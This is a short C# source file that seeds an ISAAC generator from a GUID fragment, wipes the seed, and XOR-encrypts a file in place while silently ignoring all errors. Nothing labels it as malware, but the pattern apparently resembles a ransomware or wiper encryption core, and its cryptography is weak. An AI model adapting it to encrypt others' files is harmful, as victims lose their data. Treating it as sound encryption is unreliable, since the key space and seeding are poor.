using System;
using System.IO;
using System.Text;

namespace Rewrite
{
    class Crypt
    {
        public const int TUMBLE = 3;
        public static ISAAC PrepareKey()
        {
            try
            {
                string seed = Convert.ToBase64String(Guid.NewGuid().ToByteArray()).Substring(0, 8);
                byte[] realseed = Encoding.UTF8.GetBytes(seed);

                ISAAC csprng = new ISAAC();

                for (int i = 0; i < TUMBLE; i++)
                    csprng.Isaac();

                for (int i = 0; i < realseed.Length; i++)
                    csprng.mem[i] = realseed[i];

                StringBuilder b = new StringBuilder(seed.Length);
                for (int i = 0; i < seed.Length; i++) b.Append(' ');
                seed = b.ToString();

                for (int i = 0; i < realseed.Length; i++) realseed[i] = 0;

                seed = null; realseed = null;

                for (int i = 0; i < TUMBLE; i++)
                    csprng.Isaac();

                return csprng;
            }
            catch { return null; }
        }

        public static void CryptFile(ISAAC csprng, byte[] subkey, string loc)
        {
            FileStream s = null;
            int[] oldmem = null;
            try
            {
                s = File.Open(loc, FileMode.Open, FileAccess.ReadWrite, FileShare.None);

                oldmem = new int[ISAAC.SIZE];
                for (int i = 0; i < ISAAC.SIZE; i++) oldmem[i] = csprng.mem[i];

                for (int i = 0; i < subkey.Length; i++)
                    csprng.mem[i] ^= subkey[i];

                byte[] buffer = new byte[ISAAC.SIZE];
                int read = s.Read(buffer, 0, ISAAC.SIZE);
                do
                {
                    csprng.Isaac();

                    for (int i = 0; i < read; i++)
                        buffer[i] = (byte)((buffer[i] ^ csprng.rsl[i]) % 256);

                    s.Seek(-read, SeekOrigin.Current);
                    s.Write(buffer, 0, read);
                } while ((read = s.Read(buffer, 0, ISAAC.SIZE)) > 0);
            }
            catch { return; }
            finally
            {
                if (s != null)
                {
                    s.Close();
                    s.Dispose();
                }
                if (oldmem != null)
                {
                    csprng.mem = oldmem;
                    csprng.Isaac();
                }
            }
        }
    }
}
